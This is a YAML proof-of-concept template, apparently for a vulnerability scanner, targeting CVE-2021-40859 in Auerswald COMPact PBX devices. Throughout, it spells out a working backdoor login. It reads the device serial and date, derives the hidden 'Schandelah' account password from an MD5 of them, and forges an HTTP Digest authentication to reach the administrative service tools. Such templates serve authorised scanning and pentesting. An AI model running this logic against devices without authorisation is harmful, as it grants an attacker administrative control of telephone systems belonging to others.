name: poc-yaml-auerswald-cve-2021-40859
binding: 5f560dce-b66f-4a50-af0e-e6b643e2a6b0
manual: true
detail:
    author: Jarcis-cy(https://github.com/jarcis-cy)
    links:
        - https://www.redteam-pentesting.de/en/advisories/rt-sa-2021-007/-auerswald-compact-multiple-backdoors
    vulnerability:
        id: CT-218047
        level: critical
    summary: username:Schandelah;password:{{password}}
transport: http
set:
    dcnonce: randomLowercase(8)
rules:
    r1:
        request:
            cache: true
            method: GET
            path: /about_state
        expression: response.status == 200 && "serial.*?\\d+.,".bmatches(response.body) && "date.+?20[0-9][0-9].,".bmatches(response.body)
        output:
            search: '''serial":"(?P<serial>.+?)","date''.bsubmatch(response.body)'
            serial: search["serial"]
            search1: '''date":"(?P<date>.+?)","macaddr''.bsubmatch(response.body)'
            date: search1["date"]
            HA: serial + "r2d2" + date
            password: substr(md5(HA), 0, 7)
    r2:
        request:
            cache: true
            method: GET
            path: /tree
        expression: response.status == 401
        output:
            search2: '''nonce="(?P<nonce>.*)", opaque''.submatch(response.headers["WWW-Authenticate"])'
            nonce: search2["nonce"]
            search3: '''opaque="(?P<opaque>.*)",algorithm''.submatch(response.headers["WWW-Authenticate"])'
            opaque: search3["opaque"]
            cnonce: substr(md5(dcnonce), 0, 16)
            username: '"Schandelah"'
            OHA1: username + ":Auerswald:" + password
            HA1: md5(OHA1)
            resp: HA1 + ":" + nonce + ":" + "00000001" + ":" + cnonce + ":auth:a94ba59ccc1aaf76cedba69ce4d102d2"
            respmd5: md5(resp)
    r3:
        request:
            cache: true
            method: GET
            path: /tree
            headers:
                Authorization: Digest username="Schandelah", realm="Auerswald", nonce="{{nonce}}", uri="/tree", algorithm=MD5, response="{{respmd5}}", opaque="{{opaque}}", algorithm="MD5", qop=auth, nc=00000001, cnonce="{{cnonce}}"
            follow_redirects: true
        expression: response.status == 200 && response.body.bcontains(b"Servicetools")
expression: r1() && r2() && r3()
